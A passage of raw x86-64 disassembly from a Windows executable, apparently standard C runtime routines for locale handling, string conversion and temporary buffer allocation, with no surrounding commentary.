   14000b726:	48 83 ec 40          	sub    $0x40,%rsp
   14000b72a:	48 8b da             	mov    %rdx,%rbx
   14000b72d:	48 8b f9             	mov    %rcx,%rdi
   14000b730:	48 85 c9             	test   %rcx,%rcx
   14000b733:	75 14                	jne    0x14000b749
   14000b735:	e8 7a b4 ff ff       	call   0x140006bb4
   14000b73a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b740:	e8 33 b3 ff ff       	call   0x140006a78
   14000b745:	33 c0                	xor    %eax,%eax
   14000b747:	eb 60                	jmp    0x14000b7a9
   14000b749:	48 85 db             	test   %rbx,%rbx
   14000b74c:	74 e7                	je     0x14000b735
   14000b74e:	48 3b fb             	cmp    %rbx,%rdi
   14000b751:	73 f2                	jae    0x14000b745
   14000b753:	49 8b d0             	mov    %r8,%rdx
   14000b756:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b75b:	e8 5c bf ff ff       	call   0x1400076bc
   14000b760:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000b765:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   14000b769:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   14000b76d:	74 24                	je     0x14000b793
   14000b76f:	48 ff ca             	dec    %rdx
   14000b772:	48 3b fa             	cmp    %rdx,%rdi
   14000b775:	77 0a                	ja     0x14000b781
   14000b777:	0f b6 02             	movzbl (%rdx),%eax
   14000b77a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   14000b77f:	75 ee                	jne    0x14000b76f
   14000b781:	48 8b cb             	mov    %rbx,%rcx
   14000b784:	48 2b ca             	sub    %rdx,%rcx
   14000b787:	48 8b d3             	mov    %rbx,%rdx
   14000b78a:	83 e1 01             	and    $0x1,%ecx
   14000b78d:	48 2b d1             	sub    %rcx,%rdx
   14000b790:	48 ff ca             	dec    %rdx
   14000b793:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000b798:	74 0c                	je     0x14000b7a6
   14000b79a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b79f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b7a6:	48 8b c2             	mov    %rdx,%rax
   14000b7a9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000b7ae:	48 83 c4 40          	add    $0x40,%rsp
   14000b7b2:	5f                   	pop    %rdi
   14000b7b3:	c3                   	ret
   14000b7b4:	40 55                	rex push %rbp
   14000b7b6:	41 54                	push   %r12
   14000b7b8:	41 55                	push   %r13
   14000b7ba:	41 56                	push   %r14
   14000b7bc:	41 57                	push   %r15
   14000b7be:	48 83 ec 60          	sub    $0x60,%rsp
   14000b7c2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000b7c7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000b7cb:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000b7cf:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000b7d3:	48 8b 05 26 e8 00 00 	mov    0xe826(%rip),%rax        # 0x14001a000
   14000b7da:	48 33 c5             	xor    %rbp,%rax
   14000b7dd:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000b7e1:	48 63 7d 60          	movslq 0x60(%rbp),%rdi
   14000b7e5:	49 8b f1             	mov    %r9,%rsi
   14000b7e8:	45 8b e0             	mov    %r8d,%r12d
   14000b7eb:	4c 8b ea             	mov    %rdx,%r13
   14000b7ee:	48 8b d9             	mov    %rcx,%rbx
   14000b7f1:	85 ff                	test   %edi,%edi
   14000b7f3:	7e 14                	jle    0x14000b809
   14000b7f5:	48 8b d7             	mov    %rdi,%rdx
   14000b7f8:	49 8b c9             	mov    %r9,%rcx
   14000b7fb:	e8 88 18 00 00       	call   0x14000d088
   14000b800:	3b c7                	cmp    %edi,%eax
   14000b802:	8d 78 01             	lea    0x1(%rax),%edi
   14000b805:	7c 02                	jl     0x14000b809
   14000b807:	8b f8                	mov    %eax,%edi
   14000b809:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000b80d:	45 85 f6             	test   %r14d,%r14d
   14000b810:	75 07                	jne    0x14000b819
   14000b812:	48 8b 03             	mov    (%rbx),%rax
   14000b815:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000b819:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000b81f:	44 8b cf             	mov    %edi,%r9d
   14000b822:	4c 8b c6             	mov    %rsi,%r8
   14000b825:	41 8b ce             	mov    %r14d,%ecx
   14000b828:	1b d2                	sbb    %edx,%edx
   14000b82a:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000b82f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000b835:	83 e2 08             	and    $0x8,%edx
   14000b838:	ff c2                	inc    %edx
   14000b83a:	e8 1d cd ff ff       	call   0x14000855c
   14000b83f:	33 d2                	xor    %edx,%edx
   14000b841:	4c 63 f8             	movslq %eax,%r15
   14000b844:	85 c0                	test   %eax,%eax
   14000b846:	0f 84 73 02 00 00    	je     0x14000babf
   14000b84c:	49 8b c7             	mov    %r15,%rax
   14000b84f:	48 03 c0             	add    %rax,%rax
   14000b852:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000b856:	48 3b c1             	cmp    %rcx,%rax
   14000b859:	48 1b c0             	sbb    %rax,%rax
   14000b85c:	48 23 c1             	and    %rcx,%rax
   14000b85f:	0f 84 3d 02 00 00    	je     0x14000baa2
   14000b865:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000b86c:	ff ff 0f 
   14000b86f:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   14000b875:	77 31                	ja     0x14000b8a8
   14000b877:	48 8d 48 0f          	lea    0xf(%rax),%rcx
   14000b87b:	48 3b c8             	cmp    %rax,%rcx
   14000b87e:	77 03                	ja     0x14000b883
   14000b880:	49 8b c8             	mov    %r8,%rcx
   14000b883:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000b887:	48 8b c1             	mov    %rcx,%rax
   14000b88a:	e8 c1 34 00 00       	call   0x14000ed50
   14000b88f:	48 2b e1             	sub    %rcx,%rsp
   14000b892:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000b897:	48 85 db             	test   %rbx,%rbx
   14000b89a:	0f 84 05 02 00 00    	je     0x14000baa5
   14000b8a0:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000b8a6:	eb 18                	jmp    0x14000b8c0
   14000b8a8:	48 8b c8             	mov    %rax,%rcx
   14000b8ab:	e8 f8 dc ff ff       	call   0x1400095a8
   14000b8b0:	33 d2                	xor    %edx,%edx
   14000b8b2:	48 8b d8             	mov    %rax,%rbx
   14000b8b5:	48 85 c0             	test   %rax,%rax
   14000b8b8:	74 0a                	je     0x14000b8c4
   14000b8ba:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000b8c0:	48 83 c3 10          	add    $0x10,%rbx
   14000b8c4:	48 85 db             	test   %rbx,%rbx
   14000b8c7:	0f 84 d8 01 00 00    	je     0x14000baa5
   14000b8cd:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000b8d2:	44 8b cf             	mov    %edi,%r9d
   14000b8d5:	4c 8b c6             	mov    %rsi,%r8
   14000b8d8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b8dd:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b8e2:	41 8b ce             	mov    %r14d,%ecx
   14000b8e5:	e8 72 cc ff ff       	call   0x14000855c
   14000b8ea:	33 d2                	xor    %edx,%edx
   14000b8ec:	85 c0                	test   %eax,%eax
   14000b8ee:	0f 84 b1 01 00 00    	je     0x14000baa5
   14000b8f4:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000b8f9:	45 8b cf             	mov    %r15d,%r9d
   14000b8fc:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000b901:	4c 8b c3             	mov    %rbx,%r8
   14000b904:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000b909:	49 8b cd             	mov    %r13,%rcx
   14000b90c:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000b910:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000b915:	41 8b d4             	mov    %r12d,%edx
   14000b918:	e8 5b e6 ff ff       	call   0x140009f78
   14000b91d:	33 d2                	xor    %edx,%edx
   14000b91f:	48 63 f0             	movslq %eax,%rsi
   14000b922:	85 c0                	test   %eax,%eax
   14000b924:	0f 84 7b 01 00 00    	je     0x14000baa5
   14000b92a:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000b930:	45 85 e0             	test   %r12d,%r8d
   14000b933:	74 51                	je     0x14000b986
   14000b935:	8b 45 70             	mov    0x70(%rbp),%eax
   14000b938:	85 c0                	test   %eax,%eax
   14000b93a:	0f 84 6c 01 00 00    	je     0x14000baac
   14000b940:	3b f0                	cmp    %eax,%esi
   14000b942:	0f 8f 5d 01 00 00    	jg     0x14000baa5
   14000b948:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000b94d:	45 8b cf             	mov    %r15d,%r9d
   14000b950:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000b955:	4c 8b c3             	mov    %rbx,%r8
   14000b958:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000b95d:	49 8b cd             	mov    %r13,%rcx
   14000b960:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b964:	41 8b d4             	mov    %r12d,%edx
   14000b967:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000b96b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b970:	e8 03 e6 ff ff       	call   0x140009f78
   14000b975:	33 d2                	xor    %edx,%edx
   14000b977:	8b f0                	mov    %eax,%esi
   14000b979:	85 c0                	test   %eax,%eax
   14000b97b:	0f 85 2b 01 00 00    	jne    0x14000baac
   14000b981:	e9 1f 01 00 00       	jmp    0x14000baa5
   14000b986:	48 8b ce             	mov    %rsi,%rcx
   14000b989:	48 03 c9             	add    %rcx,%rcx
   14000b98c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000b990:	48 3b c8             	cmp    %rax,%rcx
   14000b993:	48 1b c9             	sbb    %rcx,%rcx
   14000b996:	48 23 c8             	and    %rax,%rcx
   14000b999:	0f 84 e6 00 00 00    	je     0x14000ba85
   14000b99f:	49 3b c8             	cmp    %r8,%rcx
   14000b9a2:	77 35                	ja     0x14000b9d9
   14000b9a4:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000b9a8:	48 3b c1             	cmp    %rcx,%rax
   14000b9ab:	77 0a                	ja     0x14000b9b7
   14000b9ad:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000b9b4:	ff ff 0f 
   14000b9b7:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000b9bb:	e8 90 33 00 00       	call   0x14000ed50
   14000b9c0:	48 2b e0             	sub    %rax,%rsp
   14000b9c3:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000b9c8:	48 85 ff             	test   %rdi,%rdi
   14000b9cb:	0f 84 cd 00 00 00    	je     0x14000ba9e
   14000b9d1:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000b9d7:	eb 15                	jmp    0x14000b9ee
   14000b9d9:	e8 ca db ff ff       	call   0x1400095a8
   14000b9de:	33 d2                	xor    %edx,%edx
   14000b9e0:	48 8b f8             	mov    %rax,%rdi
   14000b9e3:	48 85 c0             	test   %rax,%rax
   14000b9e6:	74 0a                	je     0x14000b9f2
   14000b9e8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000b9ee:	48 83 c7 10          	add    $0x10,%rdi
   14000b9f2:	48 85 ff             	test   %rdi,%rdi
   14000b9f5:	0f 84 a3 00 00 00    	je     0x14000ba9e
   14000b9fb:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000ba00:	45 8b cf             	mov    %r15d,%r9d
   14000ba03:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000ba08:	4c 8b c3             	mov    %rbx,%r8
   14000ba0b:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000ba10:	49 8b cd             	mov    %r13,%rcx
   14000ba13:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000ba17:	41 8b d4             	mov    %r12d,%edx
   14000ba1a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ba1f:	e8 54 e5 ff ff       	call   0x140009f78
   14000ba24:	33 d2                	xor    %edx,%edx
   14000ba26:	85 c0                	test   %eax,%eax
   14000ba28:	74 5e                	je     0x14000ba88
   14000ba2a:	8b 45 70             	mov    0x70(%rbp),%eax
   14000ba2d:	44 8b ce             	mov    %esi,%r9d
   14000ba30:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000ba35:	4c 8b c7             	mov    %rdi,%r8
   14000ba38:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000ba3d:	41 8b ce             	mov    %r14d,%ecx
   14000ba40:	85 c0                	test   %eax,%eax
   14000ba42:	75 16                	jne    0x14000ba5a
   14000ba44:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000ba48:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000ba4d:	e8 9a cb ff ff       	call   0x1400085ec
   14000ba52:	8b f0                	mov    %eax,%esi
   14000ba54:	85 c0                	test   %eax,%eax
   14000ba56:	75 1a                	jne    0x14000ba72
   14000ba58:	eb 2e                	jmp    0x14000ba88
   14000ba5a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ba5e:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000ba62:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ba67:	e8 80 cb ff ff       	call   0x1400085ec
   14000ba6c:	8b f0                	mov    %eax,%esi
   14000ba6e:	85 c0                	test   %eax,%eax
   14000ba70:	74 1b                	je     0x14000ba8d
   14000ba72:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000ba76:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000ba7c:	75 2e                	jne    0x14000baac
   14000ba7e:	e8 c9 b1 ff ff       	call   0x140006c4c
   14000ba83:	eb 27                	jmp    0x14000baac
   14000ba85:	48 8b fa             	mov    %rdx,%rdi
   14000ba88:	48 85 ff             	test   %rdi,%rdi
   14000ba8b:	74 11                	je     0x14000ba9e
   14000ba8d:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000ba91:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000ba97:	75 05                	jne    0x14000ba9e
   14000ba99:	e8 ae b1 ff ff       	call   0x140006c4c
   14000ba9e:	33 f6                	xor    %esi,%esi
   14000baa0:	eb 0a                	jmp    0x14000baac
   14000baa2:	48 8b da             	mov    %rdx,%rbx
   14000baa5:	8b f2                	mov    %edx,%esi
   14000baa7:	48 85 db             	test   %rbx,%rbx
   14000baaa:	74 11                	je     0x14000babd
   14000baac:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000bab0:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bab6:	75 05                	jne    0x14000babd
   14000bab8:	e8 8f b1 ff ff       	call   0x140006c4c
   14000babd:	8b c6                	mov    %esi,%eax
   14000babf:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000bac3:	48 33 cd             	xor    %rbp,%rcx
   14000bac6:	e8 95 58 ff ff       	call   0x140001360
   14000bacb:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000bacf:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000bad3:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000bad7:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000badb:	41 5f                	pop    %r15
   14000badd:	41 5e                	pop    %r14
   14000badf:	41 5d                	pop    %r13
   14000bae1:	41 5c                	pop    %r12
   14000bae3:	5d                   	pop    %rbp
   14000bae4:	c3                   	ret
   14000bae5:	cc                   	int3
   14000bae6:	cc                   	int3
   14000bae7:	cc                   	int3
   14000bae8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000baed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000baf2:	57                   	push   %rdi
   14000baf3:	48 83 ec 70          	sub    $0x70,%rsp
   14000baf7:	48 8b f2             	mov    %rdx,%rsi
   14000bafa:	49 8b d9             	mov    %r9,%rbx
   14000bafd:	48 8b d1             	mov    %rcx,%rdx
   14000bb00:	41 8b f8             	mov    %r8d,%edi
   14000bb03:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000bb08:	e8 af bb ff ff       	call   0x1400076bc
   14000bb0d:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000bb14:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000bb19:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000bb1d:	4c 8b cb             	mov    %rbx,%r9
   14000bb20:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000bb27:	44 8b c7             	mov    %edi,%r8d
   14000bb2a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000bb2e:	48 8b d6             	mov    %rsi,%rdx
   14000bb31:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000bb38:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000bb3c:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000bb43:	00 
   14000bb44:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000bb49:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000bb50:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000bb54:	e8 5b fc ff ff       	call   0x14000b7b4
   14000bb59:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000bb5e:	74 0c                	je     0x14000bb6c
   14000bb60:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000bb65:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bb6c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000bb71:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000bb75:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000bb79:	49 8b e3             	mov    %r11,%rsp
   14000bb7c:	5f                   	pop    %rdi
   14000bb7d:	c3                   	ret
   14000bb7e:	cc                   	int3
   14000bb7f:	cc                   	int3
   14000bb80:	48 83 ec 28          	sub    $0x28,%rsp
   14000bb84:	e8 0f c6 ff ff       	call   0x140008198
   14000bb89:	33 c9                	xor    %ecx,%ecx
   14000bb8b:	84 c0                	test   %al,%al
   14000bb8d:	0f 94 c1             	sete   %cl
   14000bb90:	8b c1                	mov    %ecx,%eax
   14000bb92:	48 83 c4 28          	add    $0x28,%rsp
   14000bb96:	c3                   	ret
   14000bb97:	cc                   	int3
   14000bb98:	83 3d e1 f7 00 00 00 	cmpl   $0x0,0xf7e1(%rip)        # 0x14001b380
   14000bb9f:	0f 84 47 15 00 00    	je     0x14000d0ec
   14000bba5:	45 33 c9             	xor    %r9d,%r9d
   14000bba8:	e9 03 00 00 00       	jmp    0x14000bbb0
   14000bbad:	cc                   	int3
   14000bbae:	cc                   	int3
   14000bbaf:	cc                   	int3
   14000bbb0:	48 8b c4             	mov    %rsp,%rax
   14000bbb3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bbb7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000bbbb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000bbbf:	57                   	push   %rdi
   14000bbc0:	48 83 ec 60          	sub    $0x60,%rsp
   14000bbc4:	48 8b f2             	mov    %rdx,%rsi
   14000bbc7:	48 8b e9             	mov    %rcx,%rbp
   14000bbca:	49 8b d1             	mov    %r9,%rdx
   14000bbcd:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   14000bbd1:	49 8b f8             	mov    %r8,%rdi
   14000bbd4:	e8 e3 ba ff ff       	call   0x1400076bc
   14000bbd9:	48 85 ff             	test   %rdi,%rdi
   14000bbdc:	75 07                	jne    0x14000bbe5
   14000bbde:	33 db                	xor    %ebx,%ebx
   14000bbe0:	e9 a0 00 00 00       	jmp    0x14000bc85
   14000bbe5:	48 85 ed             	test   %rbp,%rbp
   14000bbe8:	74 05                	je     0x14000bbef
   14000bbea:	48 85 f6             	test   %rsi,%rsi
   14000bbed:	75 17                	jne    0x14000bc06
   14000bbef:	e8 c0 af ff ff       	call   0x140006bb4
   14000bbf4:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bbfa:	e8 79 ae ff ff       	call   0x140006a78
   14000bbff:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000bc04:	eb 7f                	jmp    0x14000bc85
   14000bc06:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000bc0b:	48 3b fb             	cmp    %rbx,%rdi
   14000bc0e:	76 12                	jbe    0x14000bc22
   14000bc10:	e8 9f af ff ff       	call   0x140006bb4
   14000bc15:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bc1b:	e8 58 ae ff ff       	call   0x140006a78
   14000bc20:	eb 63                	jmp    0x14000bc85
   14000bc22:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000bc27:	48 8b 90 30 01 00 00 	mov    0x130(%rax),%rdx
   14000bc2e:	48 85 d2             	test   %rdx,%rdx
   14000bc31:	75 17                	jne    0x14000bc4a
   14000bc33:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   14000bc38:	4c 8b c7             	mov    %rdi,%r8
   14000bc3b:	48 8b d6             	mov    %rsi,%rdx
   14000bc3e:	48 8b cd             	mov    %rbp,%rcx
   14000bc41:	e8 f6 14 00 00       	call   0x14000d13c
   14000bc46:	8b d8                	mov    %eax,%ebx
   14000bc48:	eb 3b                	jmp    0x14000bc85
   14000bc4a:	8b 40 14             	mov    0x14(%rax),%eax
   14000bc4d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000bc52:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000bc56:	4c 8b cd             	mov    %rbp,%r9
   14000bc59:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   14000bc5d:	41 b8 01 10 00 00    	mov    $0x1001,%r8d
   14000bc63:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000bc68:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000bc6c:	e8 ff 18 00 00       	call   0x14000d570
   14000bc71:	85 c0                	test   %eax,%eax
   14000bc73:	75 0d                	jne    0x14000bc82
   14000bc75:	e8 3a af ff ff       	call   0x140006bb4
   14000bc7a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bc80:	eb 03                	jmp    0x14000bc85
   14000bc82:	8d 58 fe             	lea    -0x2(%rax),%ebx
   14000bc85:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000bc8a:	74 0c                	je     0x14000bc98
   14000bc8c:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000bc91:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bc98:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000bc9d:	8b c3                	mov    %ebx,%eax
   14000bc9f:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000bca3:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000bca7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000bcab:	49 8b e3             	mov    %r11,%rsp
   14000bcae:	5f                   	pop    %rdi
   14000bcaf:	c3                   	ret
   14000bcb0:	48 8b c4             	mov    %rsp,%rax
   14000bcb3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bcb7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000bcbb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000bcbf:	55                   	push   %rbp
   14000bcc0:	41 56                	push   %r14
   14000bcc2:	41 57                	push   %r15
   14000bcc4:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   14000bcc8:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000bccf:	45 33 ff             	xor    %r15d,%r15d
   14000bcd2:	4c 8b f2             	mov    %rdx,%r14
   14000bcd5:	48 8b f1             	mov    %rcx,%rsi
   14000bcd8:	4c 89 7d 17          	mov    %r15,0x17(%rbp)
   14000bcdc:	33 d2                	xor    %edx,%edx
   14000bcde:	4c 89 7d 1f          	mov    %r15,0x1f(%rbp)
   14000bce2:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000bce6:	4c 89 7d 27          	mov    %r15,0x27(%rbp)
   14000bcea:	4c 89 7d 2f          	mov    %r15,0x2f(%rbp)
   14000bcee:	41 8b ff             	mov    %r15d,%edi
   14000bcf1:	4c 89 7d 37          	mov    %r15,0x37(%rbp)
   14000bcf5:	44 88 7d 3f          	mov    %r15b,0x3f(%rbp)
   14000bcf9:	4c 89 7d e7          	mov    %r15,-0x19(%rbp)
   14000bcfd:	4c 89 7d ef          	mov    %r15,-0x11(%rbp)
   14000bd01:	4c 89 7d f7          	mov    %r15,-0x9(%rbp)
   14000bd05:	4c 89 7d ff          	mov    %r15,-0x1(%rbp)
   14000bd09:	4c 89 7d 07          	mov    %r15,0x7(%rbp)
   14000bd0d:	44 88 7d 0f          	mov    %r15b,0xf(%rbp)
   14000bd11:	e8 a6 b9 ff ff       	call   0x1400076bc
   14000bd16:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000bd1a:	bb e9 fd 00 00       	mov    $0xfde9,%ebx
   14000bd1f:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000bd22:	75 16                	jne    0x14000bd3a
   14000bd24:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bd28:	74 0b                	je     0x14000bd35
   14000bd2a:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bd2e:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bd35:	44 8b cb             	mov    %ebx,%r9d
   14000bd38:	eb 36                	jmp    0x14000bd70
   14000bd3a:	e8 79 e0 ff ff       	call   0x140009db8
   14000bd3f:	85 c0                	test   %eax,%eax
   14000bd41:	75 19                	jne    0x14000bd5c
   14000bd43:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bd47:	74 0b                	je     0x14000bd54
   14000bd49:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bd4d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bd54:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000bd5a:	eb 14                	jmp    0x14000bd70
   14000bd5c:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bd60:	74 0b                	je     0x14000bd6d
   14000bd62:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bd66:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bd6d:	45 8b cf             	mov    %r15d,%r9d
   14000bd70:	4c 8d 45 77          	lea    0x77(%rbp),%r8
   14000bd74:	48 8b ce             	mov    %rsi,%rcx
   14000bd77:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   14000bd7b:	e8 1c af ff ff       	call   0x140006c9c
   14000bd80:	85 c0                	test   %eax,%eax
   14000bd82:	0f 85 88 00 00 00    	jne    0x14000be10
   14000bd88:	33 d2                	xor    %edx,%edx
   14000bd8a:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000bd8e:	e8 29 b9 ff ff       	call   0x1400076bc
   14000bd93:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000bd97:	39 58 0c             	cmp    %ebx,0xc(%rax)
   14000bd9a:	75 13                	jne    0x14000bdaf
   14000bd9c:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bda0:	74 42                	je     0x14000bde4
   14000bda2:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bda6:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bdad:	eb 35                	jmp    0x14000bde4
   14000bdaf:	e8 04 e0 ff ff       	call   0x140009db8
   14000bdb4:	85 c0                	test   %eax,%eax
   14000bdb6:	75 18                	jne    0x14000bdd0
   14000bdb8:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bdbc:	74 0b                	je     0x14000bdc9
   14000bdbe:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bdc2:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bdc9:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000bdce:	eb 14                	jmp    0x14000bde4
   14000bdd0:	44 38 7d df          	cmp    %r15b,-0x21(%rbp)
   14000bdd4:	74 0b                	je     0x14000bde1
   14000bdd6:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   14000bdda:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000bde1:	41 8b df             	mov    %r15d,%ebx
   14000bde4:	44 8b cb             	mov    %ebx,%r9d
   14000bde7:	4c 8d 45 77          	lea    0x77(%rbp),%r8
   14000bdeb:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   14000bdef:	49 8b ce             	mov    %r14,%rcx
   14000bdf2:	e8 a5 ae ff ff       	call   0x140006c9c
   14000bdf7:	48 8b 7d f7          	mov    -0x9(%rbp),%rdi
